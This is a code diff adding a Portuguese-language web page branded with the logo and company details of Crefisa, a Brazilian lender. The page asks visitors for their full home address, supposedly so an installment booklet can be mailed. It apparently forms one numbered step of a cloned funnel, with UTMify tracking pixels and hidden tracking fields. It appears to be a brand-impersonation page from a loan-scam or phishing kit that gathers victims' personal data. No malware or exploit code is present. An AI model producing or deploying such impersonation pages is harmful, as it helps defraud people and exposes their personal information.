@@ -1,0 +1,272 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        .header {
+            background: white;
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            grid-area: top-bar;
+        }
+        .main-content {
+            max-width: 450px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem 2rem 1rem 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
+        }
+        .main-content h2 {
+            margin-bottom: 20px;
+        }
+        .btn-custom {
+            color: white;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: #38C0E5;
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+        .btn-custom:hover {
+            color: black !important;
+            background-color: #38C0E5 !important;
+            transform: scale(1.02) !important;
+        }
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            width: 100%;
+            bottom: 0;
+            grid-area: footer;
+            border-bottom: solid 3px #e6007e;
+            padding: 2rem 0.5rem;
+            position: relative;
+            margin-top: 50px;
+        }
+        #conclusao {
+            display: none; /* Esconde o elemento por padrão */
+        }
+        #conclusao h4 {
+            color: green; /* Define a cor do texto */
+            font-weight: bold; /* Define o texto em negrito */
+        }
+        .char {
+            border-top: solid px #FE9005;
+            background-color: #FE9005;
+            padding: 2px !important;
+        } /* End custom CSS */
+    </style>
+    <!-- Meta Pixel Code -->
+<script>
+  window.pixelId = "66f4c93a69e84de401d813a7";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<script src="js/latest.js" data-utmify-prevent-subids="" data-utmify-fast-start="" async="" defer=""></script>
+<!-- End Meta Pixel Code -->
+
+
+
+</head><body>
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">   
+    <div class="header">
+        <img decoding="async" style="width: 120px;" src="images/Crefisa.png" alt="Imagem Centralizada">
+    </div>
+
+    <div style="grid-area: content; padding: 0 1rem;">
+        <div class="main-content">
+            <strong><h4>Onde deseja receber o carnê das parcelas?</h4></strong>
+            <p>Além de enviarmos o carnê para o seu e-mail cadastrado, será enviado também para o endereço abaixo em 7 dias úteis.</p>
+            
+            <form id="form-endereco" class="text-start" action="../crefisa/11">
+                <div class="mb-3">
+                    <label for="cep" class="form-label">CEP</label>
+                    <input type="text" class="form-control" id="cep" placeholder="00000-000" onblur="buscarCEP()">
+                </div>
+                <div id="endereco-completo">
+                    <div class="mb-3">
+                        <label for="rua" class="form-label">Rua</label>
+                        <input type="text" class="form-control" id="rua" required="">
+                    </div>
+                    <div class="mb-3">
+                        <label for="numero" class="form-label">Número</label>
+                        <input type="text" class="form-control" id="numero" required="">
+                    </div>
+                    <div class="mb-3">
+                        <label for="complemento" class="form-label">Complemento</label>
+                        <input type="text" class="form-control" id="complemento">
+                    </div>
+                    <div class="mb-3">
+                        <label for="bairro" class="form-label">Bairro</label>
+                        <input type="text" class="form-control" id="bairro" required="">
+                    </div>
+                    <div class="mb-3">
+                        <label for="cidade" class="form-label">Cidade</label>
+                        <input type="text" class="form-control" id="cidade" required="">
+                    </div>
+                    <div class="mb-3">
+                        <label for="estado" class="form-label">Estado</label>
+                        <select class="form-select" id="estado" required="">
+                            <option value="AC">Acre</option>
+                            <option value="AL">Alagoas</option>
+                            <option value="AP">Amapá</option>
+                            <option value="AM">Amazonas</option>
+                            <option value="BA">Bahia</option>
+                            <option value="CE">Ceará</option>
+                            <option value="DF">Distrito Federal</option>
+                            <option value="ES">Espírito Santo</option>
+                            <option value="GO">Goiás</option>
+                            <option value="MA">Maranhão</option>
+                            <option value="MT">Mato Grosso</option>
+                            <option value="MS">Mato Grosso do Sul</option>
+                            <option value="MG">Minas Gerais</option>
+                            <option value="PA">Pará</option>
+                            <option value="PB">Paraíba</option>
+                            <option value="PR">Paraná</option>
+                            <option value="PE">Pernambuco</option>
+                            <option value="PI">Piauí</option>
+                            <option value="RJ">Rio de Janeiro</option>
+                            <option value="RN">Rio Grande do Norte</option>
+                            <option value="RS">Rio Grande do Sul</option>
+                            <option value="RO">Rondônia</option>
+                            <option value="RR">Roraima</option>
+                            <option value="SC">Santa Catarina</option>
+                            <option value="SP">São Paulo</option>
+                            <option value="SE">Sergipe</option>
+                            <option value="TO">Tocantins</option>
+                        </select>
+                    </div>
+                </div>
+                <button type="button" id="continuar" class="btn-custom">Continuar</button>
+                <input type="hidden" name="utm_source" value="organicjLj66cbfd26af5670717b8c0905">
+                <input type="hidden" name="utm_campaign" value="rKm-km-rKm">
+                <input type="hidden" name="utm_medium" value="">
+                <input type="hidden" name="utm_content" value="">
+                <input type="hidden" name="utm_term" value="">
+                <input type="hidden" name="subid" value="organicjLj66cbfd26af5670717b8c0905">
+                <input type="hidden" name="sid2" value="rKm-km-rKm">
+                <input type="hidden" name="subid2" value="rKm-km-rKm">
+                <input type="hidden" name="subid3" value="">
+                <input type="hidden" name="subid4" value="">
+                <input type="hidden" name="subid5" value="rKm-km-rKm">
+                <input type="hidden" name="xcod" value="organicjLj66cbfd26af5670717b8c0905hQwK21wXxRrKm-km-rKmhQwK21wXxRhQwK21wXxRhQwK21wXxR">
+                <input type="hidden" name="sck" value="organicjLj66cbfd26af5670717b8c0905hQwK21wXxRrKm-km-rKmhQwK21wXxRhQwK21wXxRhQwK21wXxR">
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function buscarCEP() {
+            const cep = document.getElementById('cep').value;
+            if (cep) {
+                fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.erro) {
+                            // Grava os novos dados no localStorage
+                            localStorage.setItem('rua', data.logradouro);
+                            localStorage.setItem('numero', '');
+                            localStorage.setItem('complemento', '');
+                            localStorage.setItem('bairro', data.bairro);
+                            localStorage.setItem('cidade', data.localidade);
+                            localStorage.setItem('estado', data.uf);
+                            localStorage.setItem('cep', cep);
+
+                            document.getElementById('rua').value = data.logradouro;
+                            document.getElementById('bairro').value = data.bairro;
+                            document.getElementById('cidade').value = data.localidade;
+                            document.getElementById('estado').value = data.uf;
+                        } else {
+                            alert('CEP não encontrado.');
+                        }
+                    })
+                    .catch(error => {
+                        alert('Erro ao buscar CEP.');
+                        console.error('Erro:', error);
+                    });
+            }
+        }
+        
+        document.getElementById('continuar').addEventListener('click', function(event) {
+            const rua = document.getElementById('rua');
+            const bairro = document.getElementById('bairro');
+            const numero = document.getElementById('numero');
+            const complemento = document.getElementById('complemento');
+            const cidade = document.getElementById('cidade');
+            const estado = document.getElementById('estado');
+            const cep = document.getElementById('cep');
+            let formValido = true;
+
+            // Função para exibir erro
+            function mostrarErro(campo, mensagem) {
+                alert(mensagem);
+                campo.focus();
+                formValido = false;
+            }
+
+            // Validação do campo "Rua"
+            if (rua.value.trim() === '') {
+                mostrarErro(rua, 'Por favor, preencha o campo Rua.');
+            }
+
+            // Validação do campo "Bairro"
+            if (bairro.value.trim() === '') {
+                mostrarErro(bairro, 'Por favor, preencha o campo Bairro.');
+            }
+
+            // Validação do campo "Cidade"
+            if (cidade.value.trim() === '') {
+                mostrarErro(cidade, 'Por favor, preencha o campo Cidade.');
+            }
+
+            // Validação do campo "Estado"
+            if (estado.value.trim() === '') {
+                mostrarErro(estado, 'Por favor, selecione o Estado.');
+            }
+
+            // Se tudo estiver válido, prossegue para a próxima página
+            if (formValido) {
+                // Atualiza os valores no localStorage antes de redirecionar
+                localStorage.setItem('rua', rua.value.trim());
+                localStorage.setItem('numero', numero.value.trim());
+                localStorage.setItem('complemento', complemento.value.trim());
+                localStorage.setItem('bairro', bairro.value.trim());
+                localStorage.setItem('cidade', cidade.value.trim());
+                localStorage.setItem('estado', estado.value);
+                localStorage.setItem('cep', cep.value.trim());
+
+                window.location.href = '../11' + window.location.search;
+            }
+        });
+    </script>
+
+    <div class="footer py-4" id="footerChg">
+        © 2024 CREFISA S.A. CNPJ: 60.779.196/0001-96 <br>
+        Todos os direitos reservados
+    </div>
+</div>
+
+
+</body></html>
